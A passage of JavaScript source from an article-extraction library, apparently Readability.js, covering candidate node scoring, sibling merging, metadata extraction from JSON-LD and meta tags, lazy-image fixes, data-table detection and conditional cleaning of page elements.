          }

          // Node score divider:
          // - parent:             1 (no division)
          // - grandparent:        2
          // - great grandparent+: ancestor level * 3
          if (level === 0)
            var scoreDivider = 1;
          else if (level === 1)
            scoreDivider = 2;
          else
            scoreDivider = level * 3;
          ancestor.readability.contentScore += contentScore / scoreDivider;
        });
      });

      // After we've calculated scores, loop through all of the possible
      // candidate nodes we found and find the one with the highest score.
      var topCandidates = [];
      for (var c = 0, cl = candidates.length; c < cl; c += 1) {
        var candidate = candidates[c];

        // Scale the final candidates score based on link density. Good content
        // should have a relatively small link density (5% or less) and be mostly
        // unaffected by this operation.
        var candidateScore = candidate.readability.contentScore * (1 - this._getLinkDensity(candidate));
        candidate.readability.contentScore = candidateScore;

        this.log("Candidate:", candidate, "with score " + candidateScore);

        for (var t = 0; t < this._nbTopCandidates; t++) {
          var aTopCandidate = topCandidates[t];

          if (!aTopCandidate || candidateScore > aTopCandidate.readability.contentScore) {
            topCandidates.splice(t, 0, candidate);
            if (topCandidates.length > this._nbTopCandidates)
              topCandidates.pop();
            break;
          }
        }
      }

      var topCandidate = topCandidates[0] || null;
      var neededToCreateTopCandidate = false;
      var parentOfTopCandidate;

      // If we still have no top candidate, just use the body as a last resort.
      // We also have to copy the body node so it is something we can modify.
      if (topCandidate === null || topCandidate.tagName === "BODY") {
        // Move all of the page's children into topCandidate
        topCandidate = doc.createElement("DIV");
        neededToCreateTopCandidate = true;
        // Move everything (not just elements, also text nodes etc.) into the container
        // so we even include text directly in the body:
        while (page.firstChild) {
          this.log("Moving child out:", page.firstChild);
          topCandidate.appendChild(page.firstChild);
        }

        page.appendChild(topCandidate);

        this._initializeNode(topCandidate);
      } else if (topCandidate) {
        // Find a better top candidate node if it contains (at least three) nodes which belong to `topCandidates` array
        // and whose scores are quite closed with current `topCandidate` node.
        var alternativeCandidateAncestors = [];
        for (var i = 1; i < topCandidates.length; i++) {
          if (topCandidates[i].readability.contentScore / topCandidate.readability.contentScore >= 0.75) {
            alternativeCandidateAncestors.push(this._getNodeAncestors(topCandidates[i]));
          }
        }
        var MINIMUM_TOPCANDIDATES = 3;
        if (alternativeCandidateAncestors.length >= MINIMUM_TOPCANDIDATES) {
          parentOfTopCandidate = topCandidate.parentNode;
          while (parentOfTopCandidate.tagName !== "BODY") {
            var listsContainingThisAncestor = 0;
            for (var ancestorIndex = 0; ancestorIndex < alternativeCandidateAncestors.length && listsContainingThisAncestor < MINIMUM_TOPCANDIDATES; ancestorIndex++) {
              listsContainingThisAncestor += Number(alternativeCandidateAncestors[ancestorIndex].includes(parentOfTopCandidate));
            }
            if (listsContainingThisAncestor >= MINIMUM_TOPCANDIDATES) {
              topCandidate = parentOfTopCandidate;
              break;
            }
            parentOfTopCandidate = parentOfTopCandidate.parentNode;
          }
        }
        if (!topCandidate.readability) {
          this._initializeNode(topCandidate);
        }

        // Because of our bonus system, parents of candidates might have scores
        // themselves. They get half of the node. There won't be nodes with higher
        // scores than our topCandidate, but if we see the score going *up* in the first
        // few steps up the tree, that's a decent sign that there might be more content
        // lurking in other places that we want to unify in. The sibling stuff
        // below does some of that - but only if we've looked high enough up the DOM
        // tree.
        parentOfTopCandidate = topCandidate.parentNode;
        var lastScore = topCandidate.readability.contentScore;
        // The scores shouldn't get too low.
        var scoreThreshold = lastScore / 3;
        while (parentOfTopCandidate.tagName !== "BODY") {
          if (!parentOfTopCandidate.readability) {
            parentOfTopCandidate = parentOfTopCandidate.parentNode;
            continue;
          }
          var parentScore = parentOfTopCandidate.readability.contentScore;
          if (parentScore < scoreThreshold)
            break;
          if (parentScore > lastScore) {
            // Alright! We found a better parent to use.
            topCandidate = parentOfTopCandidate;
            break;
          }
          lastScore = parentOfTopCandidate.readability.contentScore;
          parentOfTopCandidate = parentOfTopCandidate.parentNode;
        }

        // If the top candidate is the only child, use parent instead. This will help sibling
        // joining logic when adjacent content is actually located in parent's sibling node.
        parentOfTopCandidate = topCandidate.parentNode;
        while (parentOfTopCandidate.tagName != "BODY" && parentOfTopCandidate.children.length == 1) {
          topCandidate = parentOfTopCandidate;
          parentOfTopCandidate = topCandidate.parentNode;
        }
        if (!topCandidate.readability) {
          this._initializeNode(topCandidate);
        }
      }

      // Now that we have the top candidate, look through its siblings for content
      // that might also be related. Things like preambles, content split by ads
      // that we removed, etc.
      var articleContent = doc.createElement("DIV");
      if (isPaging)
        articleContent.id = "readability-content";

      var siblingScoreThreshold = Math.max(10, topCandidate.readability.contentScore * 0.2);
      // Keep potential top candidate's parent node to try to get text direction of it later.
      parentOfTopCandidate = topCandidate.parentNode;
      var siblings = parentOfTopCandidate.children;

      for (var s = 0, sl = siblings.length; s < sl; s++) {
        var sibling = siblings[s];
        var append = false;

        this.log("Looking at sibling node:", sibling, sibling.readability ? ("with score " + sibling.readability.contentScore) : "");
        this.log("Sibling has score", sibling.readability ? sibling.readability.contentScore : "Unknown");

        if (sibling === topCandidate) {
          append = true;
        } else {
          var contentBonus = 0;

          // Give a bonus if sibling nodes and top candidates have the example same classname
          if (sibling.className === topCandidate.className && topCandidate.className !== "")
            contentBonus += topCandidate.readability.contentScore * 0.2;

          if (sibling.readability &&
              ((sibling.readability.contentScore + contentBonus) >= siblingScoreThreshold)) {
            append = true;
          } else if (sibling.nodeName === "P") {
            var linkDensity = this._getLinkDensity(sibling);
            var nodeContent = this._getInnerText(sibling);
            var nodeLength = nodeContent.length;

            if (nodeLength > 80 && linkDensity < 0.25) {
              append = true;
            } else if (nodeLength < 80 && nodeLength > 0 && linkDensity === 0 &&
                       nodeContent.search(/\.( |$)/) !== -1) {
              append = true;
            }
          }
        }

        if (append) {
          this.log("Appending node:", sibling);

          if (this.ALTER_TO_DIV_EXCEPTIONS.indexOf(sibling.nodeName) === -1) {
            // We have a node that isn't a common block level element, like a form or td tag.
            // Turn it into a div so it doesn't get filtered out later by accident.
            this.log("Altering sibling:", sibling, "to div.");

            sibling = this._setNodeTag(sibling, "DIV");
          }

          articleContent.appendChild(sibling);
          // Fetch children again to make it compatible
          // with DOM parsers without live collection support.
          siblings = parentOfTopCandidate.children;
          // siblings is a reference to the children array, and
          // sibling is removed from the array when we call appendChild().
          // As a result, we must revisit this index since the nodes
          // have been shifted.
          s -= 1;
          sl -= 1;
        }
      }

      if (this._debug)
        this.log("Article content pre-prep: " + articleContent.innerHTML);
      // So we have all of the content that we need. Now we clean it up for presentation.
      this._prepArticle(articleContent);
      if (this._debug)
        this.log("Article content post-prep: " + articleContent.innerHTML);

      if (neededToCreateTopCandidate) {
        // We already created a fake div thing, and there wouldn't have been any siblings left
        // for the previous loop, so there's no point trying to create a new div, and then
        // move all the children over. Just assign IDs and class names here. No need to append
        // because that already happened anyway.
        topCandidate.id = "readability-page-1";
        topCandidate.className = "page";
      } else {
        var div = doc.createElement("DIV");
        div.id = "readability-page-1";
        div.className = "page";
        while (articleContent.firstChild) {
          div.appendChild(articleContent.firstChild);
        }
        articleContent.appendChild(div);
      }

      if (this._debug)
        this.log("Article content after paging: " + articleContent.innerHTML);

      var parseSuccessful = true;

      // Now that we've gone through the full algorithm, check to see if
      // we got any meaningful content. If we didn't, we may need to re-run
      // grabArticle with different flags set. This gives us a higher likelihood of
      // finding the content, and the sieve approach gives us a higher likelihood of
      // finding the -right- content.
      var textLength = this._getInnerText(articleContent, true).length;
      if (textLength < this._charThreshold) {
        parseSuccessful = false;
        page.innerHTML = pageCacheHtml;

        if (this._flagIsActive(this.FLAG_STRIP_UNLIKELYS)) {
          this._removeFlag(this.FLAG_STRIP_UNLIKELYS);
          this._attempts.push({articleContent: articleContent, textLength: textLength});
        } else if (this._flagIsActive(this.FLAG_WEIGHT_CLASSES)) {
          this._removeFlag(this.FLAG_WEIGHT_CLASSES);
          this._attempts.push({articleContent: articleContent, textLength: textLength});
        } else if (this._flagIsActive(this.FLAG_CLEAN_CONDITIONALLY)) {
          this._removeFlag(this.FLAG_CLEAN_CONDITIONALLY);
          this._attempts.push({articleContent: articleContent, textLength: textLength});
        } else {
          this._attempts.push({articleContent: articleContent, textLength: textLength});
          // No luck after removing flags, just return the longest text we found during the different loops
          this._attempts.sort(function (a, b) {
            return b.textLength - a.textLength;
          });

          // But first check if we actually have something
          if (!this._attempts[0].textLength) {
            return null;
          }

          articleContent = this._attempts[0].articleContent;
          parseSuccessful = true;
        }
      }

      if (parseSuccessful) {
        // Find out text direction from ancestors of final top candidate.
        var ancestors = [parentOfTopCandidate, topCandidate].concat(this._getNodeAncestors(parentOfTopCandidate));
        this._someNode(ancestors, function(ancestor) {
          if (!ancestor.tagName)
            return false;
          var articleDir = ancestor.getAttribute("dir");
          if (articleDir) {
            this._articleDir = articleDir;
            return true;
          }
          return false;
        });
        return articleContent;
      }
    }
  },

  /**
   * Check whether the input string could be a byline.
   * This verifies that the input is a string, and that the length
   * is less than 100 chars.
   *
   * @param possibleByline {string} - a string to check whether its a byline.
   * @return Boolean - whether the input string is a byline.
   */
  _isValidByline: function(byline) {
    if (typeof byline == "string" || byline instanceof String) {
      byline = byline.trim();
      return (byline.length > 0) && (byline.length < 100);
    }
    return false;
  },

  /**
   * Converts some of the common HTML entities in string to their corresponding characters.
   *
   * @param str {string} - a string to unescape.
   * @return string without HTML entity.
   */
  _unescapeHtmlEntities: function(str) {
    if (!str) {
      return str;
    }

    var htmlEscapeMap = this.HTML_ESCAPE_MAP;
    return str.replace(/&(quot|amp|apos|lt|gt);/g, function(_, tag) {
      return htmlEscapeMap[tag];
    }).replace(/&#(?:x([0-9a-z]{1,4})|([0-9]{1,4}));/gi, function(_, hex, numStr) {
      var num = parseInt(hex || numStr, hex ? 16 : 10);
      return String.fromCharCode(num);
    });
  },

  /**
   * Try to extract metadata from JSON-LD object.
   * For now, only Schema.org objects of type Article or its subtypes are supported.
   * @return Object with any metadata that could be extracted (possibly none)
   */
  _getJSONLD: function (doc) {
    var scripts = this._getAllNodesWithTag(doc, ["script"]);

    var metadata;

    this._forEachNode(scripts, function(jsonLdElement) {
      if (!metadata && jsonLdElement.getAttribute("type") === "application/ld+json") {
        try {
          // Strip CDATA markers if present
          var content = jsonLdElement.textContent.replace(/^\s*<!\[CDATA\[|\]\]>\s*$/g, "");
          var parsed = JSON.parse(content);
          if (
            !parsed["@context"] ||
            !parsed["@context"].match(/^https?\:\/\/schema\.org$/)
          ) {
            return;
          }

          if (!parsed["@type"] && Array.isArray(parsed["@graph"])) {
            parsed = parsed["@graph"].find(function(it) {
              return (it["@type"] || "").match(
                this.REGEXPS.jsonLdArticleTypes
              );
            });
          }

          if (
            !parsed ||
            !parsed["@type"] ||
            !parsed["@type"].match(this.REGEXPS.jsonLdArticleTypes)
          ) {
            return;
          }

          metadata = {};

          if (typeof parsed.name === "string" && typeof parsed.headline === "string" && parsed.name !== parsed.headline) {
            // we have both name and headline element in the JSON-LD. They should both be the same but some websites like aktualne.cz
            // put their own name into "name" and the article title to "headline" which confuses Readability. So we try to check if either
            // "name" or "headline" closely matches the html title, and if so, use that one. If not, then we use "name" by default.

            var title = this._getArticleTitle();
            var nameMatches = this._textSimilarity(parsed.name, title) > 0.75;
            var headlineMatches = this._textSimilarity(parsed.headline, title) > 0.75;

            if (headlineMatches && !nameMatches) {
              metadata.title = parsed.headline;
            } else {
              metadata.title = parsed.name;
            }
          } else if (typeof parsed.name === "string") {
            metadata.title = parsed.name.trim();
          } else if (typeof parsed.headline === "string") {
            metadata.title = parsed.headline.trim();
          }
          if (parsed.author) {
            if (typeof parsed.author.name === "string") {
              metadata.byline = parsed.author.name.trim();
            } else if (Array.isArray(parsed.author) && parsed.author[0] && typeof parsed.author[0].name === "string") {
              metadata.byline = parsed.author
                .filter(function(author) {
                  return author && typeof author.name === "string";
                })
                .map(function(author) {
                  return author.name.trim();
                })
                .join(", ");
            }
          }
          if (typeof parsed.description === "string") {
            metadata.excerpt = parsed.description.trim();
          }
          if (
            parsed.publisher &&
            typeof parsed.publisher.name === "string"
          ) {
            metadata.siteName = parsed.publisher.name.trim();
          }
          return;
        } catch (err) {
          this.log(err.message);
        }
      }
    });
    return metadata ? metadata : {};
  },

  /**
   * Attempts to get excerpt and byline metadata for the article.
   *
   * @param {Object} jsonld — object containing any metadata that
   * could be extracted from JSON-LD object.
   *
   * @return Object with optional "excerpt" and "byline" properties
   */
  _getArticleMetadata: function(jsonld) {
    var metadata = {};
    var values = {};
    var metaElements = this._doc.getElementsByTagName("meta");

    // property is a space-separated list of values
    var propertyPattern = /\s*(dc|dcterm|og|twitter)\s*:\s*(author|creator|description|title|site_name)\s*/gi;

    // name is a single value
    var namePattern = /^\s*(?:(dc|dcterm|og|twitter|weibo:(article|webpage))\s*[\.:]\s*)?(author|creator|description|title|site_name)\s*$/i;

    // Find description tags.
    this._forEachNode(metaElements, function(element) {
      var elementName = element.getAttribute("name");
      var elementProperty = element.getAttribute("property");
      var content = element.getAttribute("content");
      if (!content) {
        return;
      }
      var matches = null;
      var name = null;

      if (elementProperty) {
        matches = elementProperty.match(propertyPattern);
        if (matches) {
          // Convert to lowercase, and remove any whitespace
          // so we can match below.
          name = matches[0].toLowerCase().replace(/\s/g, "");
          // multiple authors
          values[name] = content.trim();
        }
      }
      if (!matches && elementName && namePattern.test(elementName)) {
        name = elementName;
        if (content) {
          // Convert to lowercase, remove any whitespace, and convert dots
          // to colons so we can match below.
          name = name.toLowerCase().replace(/\s/g, "").replace(/\./g, ":");
          values[name] = content.trim();
        }
      }
    });

    // get title
    metadata.title = jsonld.title ||
                     values["dc:title"] ||
                     values["dcterm:title"] ||
                     values["og:title"] ||
                     values["weibo:article:title"] ||
                     values["weibo:webpage:title"] ||
                     values["title"] ||
                     values["twitter:title"];

    if (!metadata.title) {
      metadata.title = this._getArticleTitle();
    }

    // get author
    metadata.byline = jsonld.byline ||
                      values["dc:creator"] ||
                      values["dcterm:creator"] ||
                      values["author"];

    // get description
    metadata.excerpt = jsonld.excerpt ||
                       values["dc:description"] ||
                       values["dcterm:description"] ||
                       values["og:description"] ||
                       values["weibo:article:description"] ||
                       values["weibo:webpage:description"] ||
                       values["description"] ||
                       values["twitter:description"];

    // get site name
    metadata.siteName = jsonld.siteName ||
                        values["og:site_name"];

    // in many sites the meta value is escaped with HTML entities,
    // so here we need to unescape it
    metadata.title = this._unescapeHtmlEntities(metadata.title);
    metadata.byline = this._unescapeHtmlEntities(metadata.byline);
    metadata.excerpt = this._unescapeHtmlEntities(metadata.excerpt);
    metadata.siteName = this._unescapeHtmlEntities(metadata.siteName);

    return metadata;
  },

  /**
   * Check if node is image, or if node contains exactly only one image
   * whether as a direct child or as its descendants.
   *
   * @param Element
  **/
  _isSingleImage: function(node) {
    if (node.tagName === "IMG") {
      return true;
    }

    if (node.children.length !== 1 || node.textContent.trim() !== "") {
      return false;
    }

    return this._isSingleImage(node.children[0]);
  },

  /**
   * Find all <noscript> that are located after <img> nodes, and which contain only one
   * <img> element. Replace the first image with the image from inside the <noscript> tag,
   * and remove the <noscript> tag. This improves the quality of the images we use on
   * some sites (e.g. Medium).
   *
   * @param Element
  **/
  _unwrapNoscriptImages: function(doc) {
    // Find img without source or attributes that might contains image, and remove it.
    // This is done to prevent a placeholder img is replaced by img from noscript in next step.
    var imgs = Array.from(doc.getElementsByTagName("img"));
    this._forEachNode(imgs, function(img) {
      for (var i = 0; i < img.attributes.length; i++) {
        var attr = img.attributes[i];
        switch (attr.name) {
          case "src":
          case "srcset":
          case "data-src":
          case "data-srcset":
            return;
        }

        if (/\.(jpg|jpeg|png|webp)/i.test(attr.value)) {
          return;
        }
      }

      img.parentNode.removeChild(img);
    });

    // Next find noscript and try to extract its image
    var noscripts = Array.from(doc.getElementsByTagName("noscript"));
    this._forEachNode(noscripts, function(noscript) {
      // Parse content of noscript and make sure it only contains image
      var tmp = doc.createElement("div");
      tmp.innerHTML = noscript.innerHTML;
      if (!this._isSingleImage(tmp)) {
        return;
      }

      // If noscript has previous sibling and it only contains image,
      // replace it with noscript content. However we also keep old
      // attributes that might contains image.
      var prevElement = noscript.previousElementSibling;
      if (prevElement && this._isSingleImage(prevElement)) {
        var prevImg = prevElement;
        if (prevImg.tagName !== "IMG") {
          prevImg = prevElement.getElementsByTagName("img")[0];
        }

        var newImg = tmp.getElementsByTagName("img")[0];
        for (var i = 0; i < prevImg.attributes.length; i++) {
          var attr = prevImg.attributes[i];
          if (attr.value === "") {
            continue;
          }

          if (attr.name === "src" || attr.name === "srcset" || /\.(jpg|jpeg|png|webp)/i.test(attr.value)) {
            if (newImg.getAttribute(attr.name) === attr.value) {
              continue;
            }

            var attrName = attr.name;
            if (newImg.hasAttribute(attrName)) {
              attrName = "data-old-" + attrName;
            }

            newImg.setAttribute(attrName, attr.value);
          }
        }

        noscript.parentNode.replaceChild(tmp.firstElementChild, prevElement);
      }
    });
  },

  /**
   * Removes script tags from the DocumentNode.
   *
   * @param Element
  **/
  _removeScripts: function(doc) {
    this._removeNodes(this._getAllNodesWithTag(doc, ["script", "noscript"]));
  },

  /**
   * Check if this node has only whitespace and a single element with given tag
   * Returns false if the DIV node contains non-empty text nodes
   * or if it contains no element with given tag or more than 1 element.
   *
   * @param Element
   * @param string tag of child element
  **/
  _hasSingleTagInsideElement: function(element, tag) {
    // There should be exactly 1 element child with given tag
    if (element.children.length != 1 || element.children[0].tagName !== tag) {
      return false;
    }

    // And there should be no text nodes with real content
    return !this._someNode(element.childNodes, function(node) {
      return node.nodeType === this.TEXT_NODE &&
             this.REGEXPS.hasContent.test(node.textContent);
    });
  },

  _isElementWithoutContent: function(node) {
    return node.nodeType === this.ELEMENT_NODE &&
      node.textContent.trim().length == 0 &&
      (node.children.length == 0 ||
       node.children.length == node.getElementsByTagName("br").length + node.getElementsByTagName("hr").length);
  },

  /**
   * Determine whether element has any children block level elements.
   *
   * @param Element
   */
  _hasChildBlockElement: function (element) {
    return this._someNode(element.childNodes, function(node) {
      return this.DIV_TO_P_ELEMS.has(node.tagName) ||
             this._hasChildBlockElement(node);
    });
  },

  /***
   * Determine if a node qualifies as phrasing content.
   * https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/Content_categories#Phrasing_content
  **/
  _isPhrasingContent: function(node) {
    return node.nodeType === this.TEXT_NODE || this.PHRASING_ELEMS.indexOf(node.tagName) !== -1 ||
      ((node.tagName === "A" || node.tagName === "DEL" || node.tagName === "INS") &&
        this._everyNode(node.childNodes, this._isPhrasingContent));
  },

  _isWhitespace: function(node) {
    return (node.nodeType === this.TEXT_NODE && node.textContent.trim().length === 0) ||
           (node.nodeType === this.ELEMENT_NODE && node.tagName === "BR");
  },

  /**
   * Get the inner text of a node - cross browser compatibly.
   * This also strips out any excess whitespace to be found.
   *
   * @param Element
   * @param Boolean normalizeSpaces (default: true)
   * @return string
  **/
  _getInnerText: function(e, normalizeSpaces) {
    normalizeSpaces = (typeof normalizeSpaces === "undefined") ? true : normalizeSpaces;
    var textContent = e.textContent.trim();

    if (normalizeSpaces) {
      return textContent.replace(this.REGEXPS.normalize, " ");
    }
    return textContent;
  },

  /**
   * Get the number of times a string s appears in the node e.
   *
   * @param Element
   * @param string - what to split on. Default is ","
   * @return number (integer)
  **/
  _getCharCount: function(e, s) {
    s = s || ",";
    return this._getInnerText(e).split(s).length - 1;
  },

  /**
   * Remove the style attribute on every e and under.
   * TODO: Test if getElementsByTagName(*) is faster.
   *
   * @param Element
   * @return void
  **/
  _cleanStyles: function(e) {
    if (!e || e.tagName.toLowerCase() === "svg")
      return;

    // Remove `style` and deprecated presentational attributes
    for (var i = 0; i < this.PRESENTATIONAL_ATTRIBUTES.length; i++) {
      e.removeAttribute(this.PRESENTATIONAL_ATTRIBUTES[i]);
    }

    if (this.DEPRECATED_SIZE_ATTRIBUTE_ELEMS.indexOf(e.tagName) !== -1) {
      e.removeAttribute("width");
      e.removeAttribute("height");
    }

    var cur = e.firstElementChild;
    while (cur !== null) {
      this._cleanStyles(cur);
      cur = cur.nextElementSibling;
    }
  },

  /**
   * Get the density of links as a percentage of the content
   * This is the amount of text that is inside a link divided by the total text in the node.
   *
   * @param Element
   * @return number (float)
  **/
  _getLinkDensity: function(element) {
    var textLength = this._getInnerText(element).length;
    if (textLength === 0)
      return 0;

    var linkLength = 0;

    // XXX implement _reduceNodeList?
    this._forEachNode(element.getElementsByTagName("a"), function(linkNode) {
      var href = linkNode.getAttribute("href");
      var coefficient = href && this.REGEXPS.hashUrl.test(href) ? 0.3 : 1;
      linkLength += this._getInnerText(linkNode).length * coefficient;
    });

    return linkLength / textLength;
  },

  /**
   * Get an elements class/id weight. Uses regular expressions to tell if this
   * element looks good or bad.
   *
   * @param Element
   * @return number (Integer)
  **/
  _getClassWeight: function(e) {
    if (!this._flagIsActive(this.FLAG_WEIGHT_CLASSES))
      return 0;

    var weight = 0;

    // Look for a special classname
    if (typeof(e.className) === "string" && e.className !== "") {
      if (this.REGEXPS.negative.test(e.className))
        weight -= 25;

      if (this.REGEXPS.positive.test(e.className))
        weight += 25;
    }

    // Look for a special ID
    if (typeof(e.id) === "string" && e.id !== "") {
      if (this.REGEXPS.negative.test(e.id))
        weight -= 25;

      if (this.REGEXPS.positive.test(e.id))
        weight += 25;
    }

    return weight;
  },

  /**
   * Clean a node of all elements of type "tag".
   * (Unless it's a youtube/vimeo video. People love movies.)
   *
   * @param Element
   * @param string tag to clean
   * @return void
   **/
  _clean: function(e, tag) {
    var isEmbed = ["object", "embed", "iframe"].indexOf(tag) !== -1;

    this._removeNodes(this._getAllNodesWithTag(e, [tag]), function(element) {
      // Allow youtube and vimeo videos through as people usually want to see those.
      if (isEmbed) {
        // First, check the elements attributes to see if any of them contain youtube or vimeo
        for (var i = 0; i < element.attributes.length; i++) {
          if (this._allowedVideoRegex.test(element.attributes[i].value)) {
            return false;
          }
        }

        // For embed with <object> tag, check inner HTML as well.
        if (element.tagName === "object" && this._allowedVideoRegex.test(element.innerHTML)) {
          return false;
        }
      }

      return true;
    });
  },

  /**
   * Check if a given node has one of its ancestor tag name matching the
   * provided one.
   * @param  HTMLElement node
   * @param  String      tagName
   * @param  Number      maxDepth
   * @param  Function    filterFn a filter to invoke to determine whether this node 'counts'
   * @return Boolean
   */
  _hasAncestorTag: function(node, tagName, maxDepth, filterFn) {
    maxDepth = maxDepth || 3;
    tagName = tagName.toUpperCase();
    var depth = 0;
    while (node.parentNode) {
      if (maxDepth > 0 && depth > maxDepth)
        return false;
      if (node.parentNode.tagName === tagName && (!filterFn || filterFn(node.parentNode)))
        return true;
      node = node.parentNode;
      depth++;
    }
    return false;
  },

  /**
   * Return an object indicating how many rows and columns this table has.
   */
  _getRowAndColumnCount: function(table) {
    var rows = 0;
    var columns = 0;
    var trs = table.getElementsByTagName("tr");
    for (var i = 0; i < trs.length; i++) {
      var rowspan = trs[i].getAttribute("rowspan") || 0;
      if (rowspan) {
        rowspan = parseInt(rowspan, 10);
      }
      rows += (rowspan || 1);

      // Now look for column-related info
      var columnsInThisRow = 0;
      var cells = trs[i].getElementsByTagName("td");
      for (var j = 0; j < cells.length; j++) {
        var colspan = cells[j].getAttribute("colspan") || 0;
        if (colspan) {
          colspan = parseInt(colspan, 10);
        }
        columnsInThisRow += (colspan || 1);
      }
      columns = Math.max(columns, columnsInThisRow);
    }
    return {rows: rows, columns: columns};
  },

  /**
   * Look for 'data' (as opposed to 'layout') tables, for which we use
   * similar checks as
   * https://searchfox.org/mozilla-central/rev/f82d5c549f046cb64ce5602bfd894b7ae807c8f8/accessible/generic/TableAccessible.cpp#19
   */
  _markDataTables: function(root) {
    var tables = root.getElementsByTagName("table");
    for (var i = 0; i < tables.length; i++) {
      var table = tables[i];
      var role = table.getAttribute("role");
      if (role == "presentation") {
        table._readabilityDataTable = false;
        continue;
      }
      var datatable = table.getAttribute("datatable");
      if (datatable == "0") {
        table._readabilityDataTable = false;
        continue;
      }
      var summary = table.getAttribute("summary");
      if (summary) {
        table._readabilityDataTable = true;
        continue;
      }

      var caption = table.getElementsByTagName("caption")[0];
      if (caption && caption.childNodes.length > 0) {
        table._readabilityDataTable = true;
        continue;
      }

      // If the table has a descendant with any of these tags, consider a data table:
      var dataTableDescendants = ["col", "colgroup", "tfoot", "thead", "th"];
      var descendantExists = function(tag) {
        return !!table.getElementsByTagName(tag)[0];
      };
      if (dataTableDescendants.some(descendantExists)) {
        this.log("Data table because found data-y descendant");
        table._readabilityDataTable = true;
        continue;
      }

      // Nested tables indicate a layout table:
      if (table.getElementsByTagName("table")[0]) {
        table._readabilityDataTable = false;
        continue;
      }

      var sizeInfo = this._getRowAndColumnCount(table);
      if (sizeInfo.rows >= 10 || sizeInfo.columns > 4) {
        table._readabilityDataTable = true;
        continue;
      }
      // Now just go by size entirely:
      table._readabilityDataTable = sizeInfo.rows * sizeInfo.columns > 10;
    }
  },

  /* convert images and figures that have properties like data-src into images that can be loaded without JS */
  _fixLazyImages: function (root) {
    this._forEachNode(this._getAllNodesWithTag(root, ["img", "picture", "figure"]), function (elem) {
      // In some sites (e.g. Kotaku), they put 1px square image as base64 data uri in the src attribute.
      // So, here we check if the data uri is too short, just might as well remove it.
      if (elem.src && this.REGEXPS.b64DataUrl.test(elem.src)) {
        // Make sure it's not SVG, because SVG can have a meaningful image in under 133 bytes.
        var parts = this.REGEXPS.b64DataUrl.exec(elem.src);
        if (parts[1] === "image/svg+xml") {
          return;
        }

        // Make sure this element has other attributes which contains image.
        // If it doesn't, then this src is important and shouldn't be removed.
        var srcCouldBeRemoved = false;
        for (var i = 0; i < elem.attributes.length; i++) {
          var attr = elem.attributes[i];
          if (attr.name === "src") {
            continue;
          }

          if (/\.(jpg|jpeg|png|webp)/i.test(attr.value)) {
            srcCouldBeRemoved = true;
            break;
          }
        }

        // Here we assume if image is less than 100 bytes (or 133B after encoded to base64)
        // it will be too small, therefore it might be placeholder image.
        if (srcCouldBeRemoved) {
          var b64starts = elem.src.search(/base64\s*/i) + 7;
          var b64length = elem.src.length - b64starts;
          if (b64length < 133) {
            elem.removeAttribute("src");
          }
        }
      }

      // also check for "null" to work around https://github.com/jsdom/jsdom/issues/2580
      if ((elem.src || (elem.srcset && elem.srcset != "null")) && elem.className.toLowerCase().indexOf("lazy") === -1) {
        return;
      }

      for (var j = 0; j < elem.attributes.length; j++) {
        attr = elem.attributes[j];
        if (attr.name === "src" || attr.name === "srcset" || attr.name === "alt") {
          continue;
        }
        var copyTo = null;
        if (/\.(jpg|jpeg|png|webp)\s+\d/.test(attr.value)) {
          copyTo = "srcset";
        } else if (/^\s*\S+\.(jpg|jpeg|png|webp)\S*\s*$/.test(attr.value)) {
          copyTo = "src";
        }
        if (copyTo) {
          //if this is an img or picture, set the attribute directly
          if (elem.tagName === "IMG" || elem.tagName === "PICTURE") {
            elem.setAttribute(copyTo, attr.value);
          } else if (elem.tagName === "FIGURE" && !this._getAllNodesWithTag(elem, ["img", "picture"]).length) {
            //if the item is a <figure> that does not contain an image or picture, create one and place it inside the figure
            //see the nytimes-3 testcase for an example
            var img = this._doc.createElement("img");
            img.setAttribute(copyTo, attr.value);
            elem.appendChild(img);
          }
        }
      }
    });
  },

  _getTextDensity: function(e, tags) {
    var textLength = this._getInnerText(e, true).length;
    if (textLength === 0) {
      return 0;
    }
    var childrenLength = 0;
    var children = this._getAllNodesWithTag(e, tags);
    this._forEachNode(children, (child) => childrenLength += this._getInnerText(child, true).length);
    return childrenLength / textLength;
  },

  /**
   * Clean an element of all tags of type "tag" if they look fishy.
   * "Fishy" is an algorithm based on content length, classnames, link density, number of images & embeds, etc.
   *
   * @return void
   **/
  _cleanConditionally: function(e, tag) {
    if (!this._flagIsActive(this.FLAG_CLEAN_CONDITIONALLY))
      return;

    // Gather counts for other typical elements embedded within.
    // Traverse backwards so we can remove nodes at the same time
    // without effecting the traversal.
    //
    // TODO: Consider taking into account original contentScore here.
    this._removeNodes(this._getAllNodesWithTag(e, [tag]), function(node) {
      // First check if this node IS data table, in which case don't remove it.
      var isDataTable = function(t) {
        return t._readabilityDataTable;
      };

      var isList = tag === "ul" || tag === "ol";
      if (!isList) {
        var listLength = 0;
        var listNodes = this._getAllNodesWithTag(node, ["ul", "ol"]);
        this._forEachNode(listNodes, (list) => listLength += this._getInnerText(list).length);
        isList = listLength / this._getInnerText(node).length > 0.9;
      }

      if (tag === "table" && isDataTable(node)) {
        return false;
      }

      // Next check if we're inside a data table, in which case don't remove it as well.
      if (this._hasAncestorTag(node, "table", -1, isDataTable)) {
        return false;
      }

      if (this._hasAncestorTag(node, "code")) {
        return false;
      }

      var weight = this._getClassWeight(node);

      this.log("Cleaning Conditionally", node);

      var contentScore = 0;

      if (weight + contentScore < 0) {
        return true;
      }

      if (this._getCharCount(node, ",") < 10) {
        // If there are not very many commas, and the number of
        // non-paragraph elements is more than paragraphs or other
        // ominous signs, remove the element.
        var p = node.getElementsByTagName("p").length;
        var img = node.getElementsByTagName("img").length;
        var li = node.getElementsByTagName("li").length - 100;
        var input = node.getElementsByTagName("input").length;
        var headingDensity = this._getTextDensity(node, ["h1", "h2", "h3", "h4", "h5", "h6"]);

        var embedCount = 0;
        var embeds = this._getAllNodesWithTag(node, ["object", "embed", "iframe"]);

        for (var i = 0; i < embeds.length; i++) {
          // If this embed has attribute that matches video regex, don't delete it.
          for (var j = 0; j < embeds[i].attributes.length; j++) {
            if (this._allowedVideoRegex.test(embeds[i].attributes[j].value)) {
              return false;
            }
          }

          // For embed with <object> tag, check inner HTML as well.
          if (embeds[i].tagName === "object" && this._allowedVideoRegex.test(embeds[i].innerHTML)) {
            return false;
          }

          embedCount++;
        }

        var linkDensity = this._getLinkDensity(node);
        var contentLength = this._getInnerText(node).length;

        var haveToRemove =
          (img > 1 && p / img < 0.5 && !this._hasAncestorTag(node, "figure")) ||
          (!isList && li > p) ||
          (input > Math.floor(p/3)) ||
